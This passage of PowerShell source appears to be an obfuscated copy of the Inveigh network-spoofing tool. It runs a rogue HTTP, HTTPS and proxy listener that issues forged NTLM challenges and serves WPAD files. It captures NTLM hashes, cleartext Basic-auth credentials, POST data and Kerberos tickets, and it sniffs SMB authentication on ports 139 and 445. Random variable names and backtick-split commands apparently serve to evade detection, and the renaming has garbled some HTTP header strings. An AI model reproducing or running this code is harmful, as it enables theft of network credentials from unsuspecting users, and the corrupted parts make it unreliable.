    }

}

# Microsoft".
$SwimChief =
{
    param ($HeavySmall,$HeapDetect,$KindLick,$MilkyCelery,$LearnHelp,$OrangeDog,$SkirtStone,
    $SuperbBlood,$SwingHorses,$RightSnail,$LunchCheat,$BadgeKind,$StewLean,$YummyShame,$YawnOdd,
    $HugeDead,$SmashDolls,$MournMean,$SilkySmelly,$JumpyWrench,$ExpandNest,$SufferRefuse,$LoadTrade,
    $RobustFail,$ReasonTrust)

    function Get-NTLMChallengeBase64
    {
        param ([String]$HeavySmall,[Bool]$BlowFasten,[String]$WearyHead,[Int]$PuffyWinter)

        $SmellyWish = Get-Date
        $SmellyWish = $SmellyWish.ToFileTime()
        $SmellyWish = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($SmellyWish))
        $SmellyWish = $SmellyWish.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

        if($HeavySmall)
        {
            $ObeseSteam = $HeavySmall
            $FurrySpooky = $ObeseSteam.Insert(2,'-').Insert(5,'-').Insert(8,'-').Insert(11,'-').Insert(14,'-').Insert(17,'-').Insert(20,'-')
            $FurrySpooky = $FurrySpooky.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }
        else
        {
            $FurrySpooky = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-ToothWave -WoodWrist 1 -WallWish 255)})
            $ObeseSteam = $FurrySpooky -replace ' ', ''
            $FurrySpooky = $FurrySpooky.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }

        if($BlowFasten)
        {
            $ToyEarth = 0x05,0x82,0x89,0x0a
        }
        else
        {
            $ToyEarth = 0x05,0x82,0x81,0x0a
        }

        if(!$LightOval.HTTP_session_table.ContainsKey("$WearyHead`:$PuffyWinter"))
        {
            $LightOval.HTTP_session_table.Add("$WearyHead`:$PuffyWinter",$ObeseSteam)
        }
        else
        {
            $LightOval.HTTP_session_table["$WearyHead`:$PuffyWinter"] = $ObeseSteam
        }

        $LightOval.output_queue.Add("[*] [$(Get-Date -format s)] $FlagBolt($LunchCheat) NTLM challenge $ObeseSteam sent to $SpringBorder`:$ForkNeed") > $null
        $HillHappen = [System.Text.Encoding]::Unicode.GetBytes($LightOval.computer_name)
        $NightStitch = [System.Text.Encoding]::Unicode.GetBytes($LightOval.netBIOS_domain)
        $WhineLame = [System.Text.Encoding]::Unicode.GetBytes($LightOval.DNS_domain)
        $IslandGrip = [System.Text.Encoding]::Unicode.GetBytes($LightOval.DNS_computer_name)
        $PlugAttach = [System.BitConverter]::GetBytes($HillHappen.Length)[0,1]
        $SnailWink = [System.BitConverter]::GetBytes($NightStitch.Length)[0,1]
        $AblazeBetter = [System.BitConverter]::GetBytes($WhineLame.Length)[0,1]
        $StoneBest = [System.BitConverter]::GetBytes($IslandGrip.Length)[0,1]
        $UncleFlag = [System.BitConverter]::GetBytes($HillHappen.Length + $NightStitch.Length + $WhineLame.Length + $WhineLame.Length + $IslandGrip.Length + 36)[0,1]
        $ManageErect = [System.BitConverter]::GetBytes($NightStitch.Length + 56)

        $UsefulFrogs = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00 +
                            $SnailWink +
                            $SnailWink +
                            0x38,0x00,0x00,0x00 +
                            $ToyEarth +
                            $FurrySpooky +
                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                            $UncleFlag +
                            $UncleFlag + 
                            $ManageErect +
                            0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f +
                            $NightStitch +
                            0x02,0x00 +
                            $SnailWink +
                            $NightStitch +
                            0x01,0x00 +
                            $PlugAttach +
                            $HillHappen +
                            0x04,0x00 +
                            $AblazeBetter +
                            $WhineLame +
                            0x03,0x00 +
                            $StoneBest +
                            $IslandGrip +
                            0x05,0x00 +
                            $AblazeBetter +
                            $WhineLame +
                            0x07,0x00,0x08,0x00 +
                            $SmellyWish +
                            0x00,0x00,0x00,0x00,0x0a,0x0a

        $ExpectChop = [System.Convert]::ToBase64String($UsefulFrogs)
        $WindBone = "NTLM " + $ExpectChop
        
        return $WindBone
    }

    if($HugeDead)
    {
        $FlagBolt = "HTTPS"
    }
    elseif($SufferRefuse)
    {
        $FlagBolt = "Proxy"
    }
    else
    {
        $FlagBolt = "HTTP"
    }

    if($RightSnail -ne '0.0.0.0')
    {
        $RightSnail = [System.Net.IPAddress]::Parse($RightSnail)
        $SailWinter = ne`w-`obje`ct System.Net.IPEndPoint($RightSnail,$LunchCheat)
    }
    else
    {
        $SailWinter = ne`w-`obje`ct System.Net.IPEndPoint([System.Net.IPAddress]::Any,$LunchCheat)
    }

    $StingyMellow = $true
    $DropLamp = ne`w-`obje`ct System.Net.Sockets.TcpListener $SailWinter
   
    if($SufferRefuse)
    {
        $OfficeLate = ne`w-`obje`ct System.Net.Sockets.LingerOption($true,0)
        $DropLamp.Server.LingerState = $OfficeLate
    }
    
    try
    {
        $DropLamp.Start()
    }
    catch
    {
        $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] Error starting $FlagBolt listener") > $null
        $error_message = $_.Exception.Message
        $error_message = $error_message -replace "`n",""
        $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
        $StingyMellow = $false
    }

    if($HeapDetect -eq 'Y')
    {

        if($LearnHelp)
        {
            $YummyCrowd = (&{for ($ColorReply = 0;$ColorReply -lt $LearnHelp.Length;$ColorReply += 2){$LearnHelp.SubString($ColorReply,2)}}) -join "-"
            $YummyCrowd = $YummyCrowd.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }
        elseif($MilkyCelery)
        {
            $YummyCrowd = Get-KerberosAES256BaseKey ($MilkyCelery.UserName).Trim("\") $MilkyCelery.Password
        }

    }
    
    :HTTP_listener_loop while($LightOval.running -and $StingyMellow)
    {
        $VulgarBoard = $null
        $RemoveClass = ne`w-`obje`ct System.Byte[] 8192
        $LipSmall = $true
        $SturdyPinch = [System.Text.Encoding]::UTF8.GetBytes("Content-EarBucket: text/html")
        $MonthRare = $null
        $CoatAttend = $null
        $JadedWound = $null
        $TankChange = ''
        $YearLick = ''
        $PartPlucky = $null
        $LovelyMother = $null
        $StewGun = $null
        $WindBone = "NTLM"

        if(!$SnatchStamp.Connected -and $LightOval.running)
        {
            $DesireUnused = $false
            $PanMale = $DropLamp.BeginAcceptTcpClient($null,$null)

            do
            {

                if(!$LightOval.running)
                {
                    break HTTP_listener_loop
                }
                
                Start-Sleep -m 10
            }
            until($PanMale.IsCompleted)

            $SnatchStamp = $DropLamp.EndAcceptTcpClient($PanMale)
            $QuackTickle = $SnatchStamp.Client.Handle
            
            if($HugeDead)
            {
                $VastRainy = $SnatchStamp.GetStream()
                $GrateSpicy = ne`w-`obje`ct System.Net.Security.SslStream($VastRainy,$false)
                $MilkyCanvas = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match $LightOval.certificate_CN})
                $GrateSpicy.AuthenticateAsServer($MilkyCanvas,$false,[System.Security.Authentication.SslProtocols]::Default,$false)
            }
            else
            {
                $GrateSpicy = $SnatchStamp.GetStream()
            }
            
        }

        if($HugeDead)
        {
            [Byte[]]$WantPeel = $null

            while($VastRainy.DataAvailable)
            {
                $BabyGrubby = $GrateSpicy.Read($RemoveClass,0,$RemoveClass.Length)
                $WantPeel += $RemoveClass[0..($BabyGrubby - 1)]
            }

            $VulgarBoard = [System.BitConverter]::ToString($WantPeel)
        }
        else
        {

            while($GrateSpicy.DataAvailable)
            {
                $GrateSpicy.Read($RemoveClass,0,$RemoveClass.Length) > $null
            }

            $VulgarBoard = [System.BitConverter]::ToString($RemoveClass)
        }
        
        if($VulgarBoard -like "47-45-54-20*" -or $VulgarBoard -like "48-45-41-44-20*" -or $VulgarBoard -like "4f-50-54-49-4f-4e-53-20*" -or $VulgarBoard -like "43-4f-4e-4e-45-43-54*" -or $VulgarBoard -like "50-4f-53-54*")
        {
            $TurkeyNarrow = $VulgarBoard.Substring($VulgarBoard.IndexOf("-20-") + 4,$VulgarBoard.Substring($VulgarBoard.IndexOf("-20-") + 1).IndexOf("-20-") - 3)
            $TurkeyNarrow = $TurkeyNarrow.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $StewGun = ne`w-`obje`ct System.String ($TurkeyNarrow,0,$TurkeyNarrow.Length)
            $SpringBorder = $SnatchStamp.Client.RemoteEndpoint.Address.IPAddressToString
            $ForkNeed = $SnatchStamp.Client.RemoteEndpoint.Port
            $SaveJuggle = $true

            if(($VulgarBoard).StartsWith("47-45-54-20"))
            {
                $ColourClass = "GET"
            }
            elseif(($VulgarBoard).StartsWith("48-45-41-44-20"))
            {
                $ColourClass = "HEAD"
            }
            elseif(($VulgarBoard).StartsWith("4f-50-54-49-4F-4E-53-20"))
            {
                $ColourClass = "OPTIONS"
            }
            elseif(($VulgarBoard).StartsWith("43-4F-4E-4E-45-43-54"))
            {
                $ColourClass = "CONNECT"
            }
            elseif(($VulgarBoard).StartsWith("50-4F-53-54-20"))
            {
                $ColourClass = "POST"
            }
            
            if($MournMean)
            {
                $LightOval.NBNS_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
                $LightOval.hostname_spoof = $true
            }

            if($VulgarBoard -like "*-48-6F-73-74-3A-20-*")
            {
                $BuryPlate = $VulgarBoard.Substring($VulgarBoard.IndexOf("-48-6F-73-74-3A-20-") + 19)
                $BuryPlate = $BuryPlate.Substring(0,$BuryPlate.IndexOf("-0D-0A-"))
                $BuryPlate = $BuryPlate.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $PartPlucky = ne`w-`obje`ct System.String ($BuryPlate,0,$BuryPlate.Length)
            }

            if($VulgarBoard -like "*-55-73-65-72-2D-41-67-65-6E-74-3A-20-*")
            {
                $PlaneGrain = $VulgarBoard.Substring($VulgarBoard.IndexOf("-55-73-65-72-2D-41-67-65-6E-74-3A-20-") + 37)
                $PlaneGrain = $PlaneGrain.Substring(0,$PlaneGrain.IndexOf("-0D-0A-"))
                $PlaneGrain = $PlaneGrain.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $LovelyMother = ne`w-`obje`ct System.String ($PlaneGrain,0,$PlaneGrain.Length)
            }

            if($FruitBridge -ne $StewGun -or $QuackTickle -ne $SnatchStamp.Client.Handle)
            {
                $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] $FlagBolt($LunchCheat) $ColourClass request for $StewGun received from $SpringBorder`:$ForkNeed") > $null
                $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] $FlagBolt($LunchCheat) host header $PartPlucky received from $SpringBorder`:$ForkNeed") > $null

                if($LovelyMother)
                {
                    $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] $FlagBolt($LunchCheat) user agent received from $SpringBorder`:$ForkNeed`:`n$LovelyMother") > $null
                }

                if($JumpyWrench -eq 'Y' -and $ExpandNest.Count -gt 0 -and ($ExpandNest | Where-Object {$LovelyMother -match $_}))
                {
                    $LightOval.output_queue.Add("[*] [$(Get-Date -format s)] $FlagBolt($LunchCheat) ignoring wpad.dat request due to user agent match from $SpringBorder`:$ForkNeed") > $null
                }

            }

            if($VulgarBoard -like "*-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-*")
            {
                $BasketMist = $VulgarBoard.Substring($VulgarBoard.IndexOf("-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-") + 46)
                $BasketMist = $BasketMist.Substring(0,$BasketMist.IndexOf("-0D-0A-"))
                $BasketMist = $BasketMist.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $YearLick = ne`w-`obje`ct System.String ($BasketMist,0,$BasketMist.Length)
            }

            if(($StewGun -notmatch '/wpad.dat' -and $SkirtStone -eq 'Anonymous') -or ($StewGun -match '/wpad.dat' -and $LoadTrade -eq 'Anonymous') -or (
            $StewGun -match '/wpad.dat' -and $LoadTrade -like 'NTLM*' -and $RobustFail.Count -gt 0 -and ($RobustFail | Where-Object {$LovelyMother -match $_})))
            {
                $NearVoice = 0x32,0x30,0x30
                $FloatHarbor = 0x4f,0x4b
                $DesireUnused = $true
            }
            else
            {

                if(($StewGun -match '/wpad.dat' -and $LoadTrade -eq 'NTLM') -or ($StewGun -notmatch '/wpad.dat' -and $SkirtStone -eq 'NTLM'))
                {
                    $MagicShiver = $true
                }
                else
                {
                    $MagicShiver = $false
                }

                if($SufferRefuse)
                {
                    $NearVoice = 0x34,0x30,0x37
                    $CoatAttend = 0x50,0x72,0x6f,0x78,0x79,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20
                }
                else
                {
                    $NearVoice = 0x34,0x30,0x31
                    $CoatAttend = 0x57,0x57,0x57,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20
                }

                $FloatHarbor = 0x55,0x6e,0x61,0x75,0x74,0x68,0x6f,0x72,0x69,0x7a,0x65,0x64
            }
            
            if($VulgarBoard -like "50-4f-53-54*")
            {
                $CakesFierce = $VulgarBoard.Substring($VulgarBoard.IndexOf("-0D-0A-0D-0A-") + 12)
                $CakesFierce = $CakesFierce.Substring(0,$CakesFierce.IndexOf("-00-"))
                $CakesFierce = $CakesFierce.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $CallNumber = ne`w-`obje`ct System.String ($CakesFierce,0,$CakesFierce.Length)

                if($SlowRub -ne $CallNumber)
                {
                    $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] $FlagBolt($LunchCheat) POST request $CallNumber captured from $SpringBorder`:$ForkNeed") > $null
                    $LightOval.POST_request_file_queue.Add($CallNumber) > $null
                    $LightOval.POST_request_list.Add($CallNumber) > $null
                }

                $SlowRub = $CallNumber
            }
            
            if($YearLick.StartsWith('NTLM '))
            {
                $YearLick = $YearLick -replace 'NTLM ',''
                [Byte[]]$WinterDreary = [System.Convert]::FromBase64String($YearLick)
                $SaveJuggle = $false

                if([System.BitConverter]::ToString($WinterDreary[8..11]) -eq '01-00-00-00')
                {
                    $WindBone = Get-NTLMChallengeBase64 $HeavySmall $MagicShiver $SpringBorder $SnatchStamp.Client.RemoteEndpoint.Port
                }
                elseif([System.BitConverter]::ToString($WinterDreary[8..11]) -eq '03-00-00-00')
                {
                    Get-NTLMResponse $WinterDreary "Y" $SpringBorder $ForkNeed $LunchCheat $FlagBolt
                    $NearVoice = 0x32,0x30,0x30
                    $FloatHarbor = 0x4f,0x4b
                    $DesireUnused = $true
                    $EggsExist = $null

                    if($SufferRefuse)
                    {
                        
                        if($YawnOdd -or $YummyShame)
                        {
                            $MonthRare = 0x43,0x61,0x63,0x68,0x65,0x2d,0x43,0x6f,0x6e,0x74,0x72,0x6f,0x6c,0x3a,0x20,0x6e,0x6f,0x2d,0x63,0x61,0x63,0x68,0x65,0x2c,0x20,0x6e,0x6f,0x2d,0x73,0x74,0x6f,0x72,0x65
                        }
                        else
                        {
                            $LipSmall = $false
                        }

                    }

                }
                else
                {
                    $DesireUnused = $true
                }

            }
            elseif($YearLick.StartsWith('Negotiate '))
            {
                $NearVoice = 0x32,0x30,0x30
                $FloatHarbor = 0x4f,0x4b
                $DesireUnused = $true
                $YearLick = $YearLick -replace 'Negotiate ',''
                [Byte[]]$WinterDreary = [System.Convert]::FromBase64String($YearLick)
                $CactusGlow = [System.BitConverter]::ToString($WinterDreary)
                $CactusGlow = $CactusGlow -replace "-",""
                $HopFour = $CactusGlow.IndexOf("2A864886F7120102020100")

                if($HopFour -gt 0)
                {
                    $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] $FlagBolt($LunchCheat) authentication method is Kerberos for $SpringBorder`:$ForkNeed") > $null

                    if($HeapDetect -eq 'Y')
                    {
                        $SaveJuggle = $false
                        New-KerberosKirbi $WinterDreary $YummyCrowd $FlagBolt $LunchCheat "$SpringBorder`:$ForkNeed"
                    }

                }
                
            }
            elseif($YearLick.Startswith('Basic '))
            {
                $NearVoice = 0x32,0x30,0x30
                $FloatHarbor = 0x4f,0x4b
                $YearLick = $YearLick -replace 'Basic ',''
                $NeedyMatch = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($YearLick))
                $DesireUnused = $true
                $LightOval.cleartext_file_queue.Add($NeedyMatch) > $null
                $LightOval.cleartext_list.Add($NeedyMatch) > $null
                $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] $FlagBolt($LunchCheat) Basic authentication cleartext credentials captured from $SpringBorder`:$ForkNeed`:") > $null
                $LightOval.output_queue.Add($NeedyMatch) > $null

                if($LightOval.file_output)
                {
                    $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $FlagBolt($LunchCheat) Basic authentication cleartext credentials written to " + "Inveigh-AskEffect.txt") > $null
                }
                 
            }

            if(($StewGun -notmatch '/wpad.dat' -and $SkirtStone -eq 'Anonymous') -or ($StewGun -match '/wpad.dat' -and $LoadTrade -eq 'Anonymous') -or (
            $RobustFail.Count -gt 0 -and $LoadTrade -like 'NTLM*' -and ($RobustFail | Where-Object {$LovelyMother -match $_})) -or $DesireUnused)
            {

                if($YummyShame -and $BadgeKind -and $StewGun -like '*.exe' -and (Test-Path (Join-Path $YummyShame $BadgeKind)) -and !(Test-Path (Join-Path $YummyShame $StewGun)))
                {
                    [Byte[]]$RunFire = [System.IO.File]::ReadAllBytes((Join-Path $YummyShame $BadgeKind))
                    $SturdyPinch = [System.Text.Encoding]::UTF8.GetBytes("Content-EarBucket: application/exe")
                }
                elseif($YummyShame)
                {

                    if($StewLean -and !(Test-Path (Join-Path $YummyShame $StewGun)) -and (Test-Path (Join-Path $YummyShame $StewLean)) -and $StewGun -notmatch '/wpad.dat')
                    {
                        [Byte[]]$RunFire = [System.IO.File]::ReadAllBytes((Join-Path $YummyShame $StewLean))
                    }
                    elseif(($StewLean -and $StewGun -eq '' -or $StewLean -and $StewGun -eq '/') -and (Test-Path (Join-Path $YummyShame $StewLean)))
                    {
                        [Byte[]]$RunFire = [System.IO.File]::ReadAllBytes((Join-Path $YummyShame $StewLean))
                    }
                    elseif($ReasonTrust -and $StewGun -match '/wpad.dat')
                    {
                        [Byte[]]$RunFire = [System.Text.Encoding]::UTF8.GetBytes($ReasonTrust)
                        $SturdyPinch = [System.Text.Encoding]::UTF8.GetBytes("Content-EarBucket: application/x-ns-JumpyWrench-autoconfig")
                    }
                    else
                    {

                        if(Test-Path (Join-Path $YummyShame $StewGun))
                        {
                            [Byte[]]$RunFire = [System.IO.File]::ReadAllBytes((Join-Path $YummyShame $StewGun))
                        }
                        else
                        {
                            [Byte[]]$RunFire = [System.Text.Encoding]::UTF8.GetBytes($YawnOdd)
                        }
            
                    }

                }
                else
                {
                
                    if($ReasonTrust -and $StewGun -match '/wpad.dat' -and (!$ExpandNest -or !($ExpandNest | Where-Object {$LovelyMother -match $_})))
                    {
                        $TankChange = $ReasonTrust
                        $SturdyPinch = [System.Text.Encoding]::UTF8.GetBytes("Content-EarBucket: application/x-ns-JumpyWrench-autoconfig")
                    }
                    elseif($YawnOdd)
                    {
                        $TankChange = $YawnOdd
                        
                        if($SwingHorses)
                        {
                            $SturdyPinch = [System.Text.Encoding]::UTF8.GetBytes("Content-EarBucket: $SwingHorses")
                        }

                    }

                    [Byte[]]$RunFire = [System.Text.Encoding]::UTF8.GetBytes($TankChange)
                }

            }
            else
            {
                [Byte[]]$RunFire = [System.Text.Encoding]::UTF8.GetBytes($TankChange)
            }

            $SmellyWish = Get-Date -format r
            $SmellyWish = [System.Text.Encoding]::UTF8.GetBytes($SmellyWish)

            if(($SkirtStone -like 'NTLM*' -and $StewGun -notmatch '/wpad.dat') -or ($LoadTrade -like 'NTLM*' -and $StewGun -match '/wpad.dat') -and !$DesireUnused)
            {

                if($HeapDetect -eq 'Y' -and ($OrangeDog.Count -gt 0 -and $OrangeDog -contains $PartPlucky))
                {
                    $JadedWound = [System.Text.Encoding]::UTF8.GetBytes("Negotiate")
                }
                else
                {
                    $JadedWound = [System.Text.Encoding]::UTF8.GetBytes($WindBone)
                }
                
            }
            elseif(($SkirtStone -eq 'Basic' -and $StewGun -notmatch '/wpad.dat') -or ($LoadTrade -eq 'Basic' -and $StewGun -match '/wpad.dat'))
            {
                $JadedWound = [System.Text.Encoding]::UTF8.GetBytes("Basic realm=$SuperbBlood")
            }
            
            $OvalKnown = ne`w-`obje`ct System.Collections.Specialized.OrderedDictionary
            $OvalKnown.Add("HTTPResponse_ResponseVersion",[Byte[]](0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20))
            $OvalKnown.Add("HTTPResponse_StatusCode",$NearVoice + [Byte[]](0x20))
            $OvalKnown.Add("HTTPResponse_ResponsePhrase",$FloatHarbor + [Byte[]](0x0d,0x0a))

            if($SaveJuggle)
            {
                $EyesMarble = [System.Text.Encoding]::UTF8.GetBytes("Connection: close")
                $OvalKnown.Add("HTTPResponse_Connection",$EyesMarble + [Byte[]](0x0d,0x0a))
            }

            $OvalKnown.Add("HTTPResponse_Server",[System.Text.Encoding]::UTF8.GetBytes("Server: Microsoft-HTTPAPI/2.0") + [Byte[]](0x0d,0x0a))
            $OvalKnown.Add("HTTPResponse_TimeStamp",[Byte[]](0x44,0x61,0x74,0x65,0x3a,0x20) + $SmellyWish + [Byte[]](0x0d,0x0a))
            $OvalKnown.Add("HTTPResponse_ContentLength",[System.Text.Encoding]::UTF8.GetBytes("Content-PlaceBook: $($RunFire.Length)") + [Byte[]](0x0d,0x0a))

            if($CoatAttend -and $JadedWound)
            {
                $OvalKnown.Add("HTTPResponse_AuthenticateHeader",$CoatAttend + $JadedWound + [Byte[]](0x0d,0x0a))
            }

            if($SturdyPinch)
            {
                $OvalKnown.Add("HTTPResponse_ContentType",$SturdyPinch + [Byte[]](0x0d,0x0a))
            }

            if($MonthRare)
            {
                $OvalKnown.Add("HTTPResponse_CacheControl",$MonthRare + [Byte[]](0x0d,0x0a))
            }

            if($LipSmall)
            {
                $OvalKnown.Add("HTTPResponse_Message",[Byte[]](0x0d,0x0a) + $RunFire)
                $PressSize = ConvertFrom-PacketOrderedDictionary $OvalKnown
                $GrateSpicy.Write($PressSize,0,$PressSize.Length)
                $GrateSpicy.Flush()
            }

            Start-Sleep -m 10
            $FruitBridge = $StewGun

            if($DesireUnused)
            {
                
                if($SufferRefuse)
                {
                    $SnatchStamp.Client.Close()
                }
                else
                {
                    $SnatchStamp.Close()
                }

            }

        }
        else
        {

            if($QuackTickle -eq $SnatchStamp.Client.Handle)
            {
                $MiddleHalf++
            }
            else
            {
                $MiddleHalf = 0
            }

            if($SaveJuggle -or $MiddleHalf -gt 20)
            {
                
                $SnatchStamp.Close()
                $MiddleHalf = 0
            }
            else
            {
                Start-Sleep -m 100
            }
            
        }
    
    }

    $SnatchStamp.Close()
    $DropLamp.Stop()
}

# Microsoft".
$InnatePrefer = 
{
    param ($HomelyShow,$HandsHop,$BootShrill,$MeekSmoggy,$SmashDolls,$HeapDetect,$KindLick,$MilkyCelery,$LearnHelp,$LipMeat,
            $TeaseNasty,$BoilClever,$WantLittle,$MurderOffer,$PeckFirst,$BlushCattle,$ThawMiddle,$SilkySmelly,$SlimyCable,
            $BreezyDesign,$FairAblaze,$NorthAmuck,$HoleRoute,$BikeLoud,$StickLame,
            $ObeyAttack,$WoozyClose,$PlugTour,$SmokeFang,$WrongAnts,
            $JokeFaulty,$OwnBump,$SameSneaky)

    $FixPowder = $true
    $byte_in = ne`w-`obje`ct System.Byte[] 4	
    $byte_out = ne`w-`obje`ct System.Byte[] 4	
    $byte_data = ne`w-`obje`ct System.Byte[] 65534
    $byte_in[0] = 1
    $byte_in[1-3] = 0
    $byte_out[0] = 1
    $byte_out[1-3] = 0
    $GroanDress = ne`w-`obje`ct System.Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::IP)
    $GroanDress.SetSocketOption("IP","HeaderIncluded",$true)
    $GroanDress.ReceiveBufferSize = 65534

    if($HeapDetect -eq 'Y')
    {

        if($LearnHelp)
        {
            $YummyCrowd = (&{for ($ColorReply = 0;$ColorReply -lt $LearnHelp.Length;$ColorReply += 2){$LearnHelp.SubString($ColorReply,2)}}) -join "-"
            $YummyCrowd = $YummyCrowd.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }
        elseif($MilkyCelery)
        {
            $YummyCrowd = Get-KerberosAES256BaseKey ($MilkyCelery.UserName).Trim("\") $MilkyCelery.Password
        }

    }

    try
    {
        $WealthSecond = ne`w-`obje`ct System.Net.IPEndpoint([System.Net.IPAddress]"$SmashDolls",0)
    }
    catch
    {
        $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] Error starting sniffer/spoofer") > $null
        $error_message = $_.Exception.Message
        $error_message = $error_message -replace "`n",""
        $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
        $FixPowder = $false
    }

    $GroanDress.Bind($WealthSecond)
    $GroanDress.IOControl([System.Net.Sockets.IOControlCode]::ReceiveAll,$byte_in,$byte_out)
    $TailCharge = [System.BitConverter]::GetBytes($HandsHop)
    [Array]::Reverse($TailCharge)
    $CheapSuperb = [System.BitConverter]::GetBytes($TeaseNasty)
    [Array]::Reverse($CheapSuperb)
    $PourDesign = [System.BitConverter]::GetBytes($MurderOffer)
    [Array]::Reverse($PourDesign)
    $BaitWound = [System.BitConverter]::GetBytes($BlushCattle)
    [Array]::Reverse($BaitWound)
    $BaseNumber = ne`w-`obje`ct System.Collections.Generic.List[string]
    $AbruptWorm = ne`w-`obje`ct System.Collections.Generic.List[string]

    if($SmokeFang)
    {    
        $PlantFoot = New-TimeSpan -Minutes $SmokeFang
        $SmokeZebra = [System.Diagnostics.Stopwatch]::StartNew()
    }

    [Byte[]]$RelyTank = 0xd4,0xc3,0xb2,0xa1,0x02,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff +
        0xff,0x00,0x00,0x01,0x00,0x00,0x00

    if($SlimyCable -eq 'File')
    {
        $RealCattle = $SilkySmelly + "\Inveigh-Packets.pcap"
        $LeftKnock = [System.IO.File]::Exists($RealCattle)
        
        try
        {
            $DogWrist = ne`w-`obje`ct System.IO.FileStream $RealCattle,'Append','Write','Read'

            if(!$LeftKnock)
            {
                $DogWrist.Write($RelyTank,0,$RelyTank.Count)
            }

        }
        catch
        {
            $error_message = $_.Exception.Message
            $error_message = $error_message -replace "`n",""
            $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
            $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] Disabling pcap output") > $null
            $SlimyCable = ''
        }

    }
    elseif($SlimyCable -eq 'Memory' -and !$LightOval.pcap)
    {
        $LightOval.pcap = ne`w-`obje`ct System.Collections.ArrayList
        $LightOval.pcap.AddRange($RelyTank)
    }

    while($LightOval.running -and $FixPowder)
    {
        $WoodCar = $GroanDress.Receive($byte_data,0,$byte_data.Length,[System.Net.Sockets.SocketFlags]::None)
        $FowlTrust = ne`w-`obje`ct System.IO.MemoryStream($byte_data,0,$WoodCar)
        $ToothGrowth = ne`w-`obje`ct System.IO.BinaryReader($FowlTrust)
        $version_HL = $ToothGrowth.ReadByte()
        $ToothGrowth.ReadByte() > $null
        $TopCast = Convert-DataToUInt16 $ToothGrowth.ReadBytes(2)
        $ToothGrowth.ReadBytes(5) > $null
        $GrainRob = $ToothGrowth.ReadByte()
        $ToothGrowth.ReadBytes(2) > $null
        $CampSkate = $ToothGrowth.ReadBytes(4)
        $StuffSky = [System.Net.IPAddress]$CampSkate
        $SystemCast = $ToothGrowth.ReadBytes(4)
        $BattleSalt = [System.Net.IPAddress]$SystemCast
        $TurkeyMove = [Int]"0x$(('{0:X}' -f $version_HL)[1])" * 4
        
        switch($GrainRob)
        {
            
            6 
            {  # Microsoft".
                $StewSmelly = Convert-DataToUInt16 $ToothGrowth.ReadBytes(2)
                $BuryRustic = Convert-DataToUInt16 $ToothGrowth.ReadBytes(2)
                $ToothGrowth.ReadBytes(8) > $null
                $HealthGrate = [Int]"0x$(('{0:X}' -f $ToothGrowth.ReadByte())[0])" * 4
                $BloodyBoil = $ToothGrowth.ReadByte()
                $ToothGrowth.ReadBytes($HealthGrate - 14) > $null
                $ScaleAgree = $ToothGrowth.ReadBytes($WoodCar)
                $BloodyBoil = ([convert]::ToString($BloodyBoil,2)).PadLeft(8,"0")

                if($BloodyBoil.SubString(6,1) -eq "1" -and $BloodyBoil.SubString(3,1) -eq "0" -and $BattleSalt -eq $SmashDolls)
                {
                    $WormNarrow = "$StuffSky`:$StewSmelly"
                    $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] TCP($BuryRustic) SYN packet detected from $WormNarrow") > $null
                }

                switch ($BuryRustic)
                {

                    139 
                    {

                        if($ScaleAgree)
                        {
                            Get-SMBConnection $ScaleAgree $SmashDolls $StuffSky $BattleSalt $StewSmelly "139"
                        }

                        if($LightOval.SMB_session_table.ContainsKey("$StuffSky`:$StewSmelly"))
                        {
                            Get-NTLMResponse $ScaleAgree $NorthAmuck $StuffSky $StewSmelly 139 "SMB"
                        }

                    }

                    445
                    {

                        if($RemindHammer.Count -lt $RateBabies -and "$StuffSky`:$StewSmelly" -eq $HumorRoof)
                        {
                            $RemindHammer += $ScaleAgree

                            if($RemindHammer.Count -ge $RateBabies)
                            {
                                New-KerberosKirbi $RemindHammer $YummyCrowd "SMB" 445 "$StuffSky`:$StewSmelly"
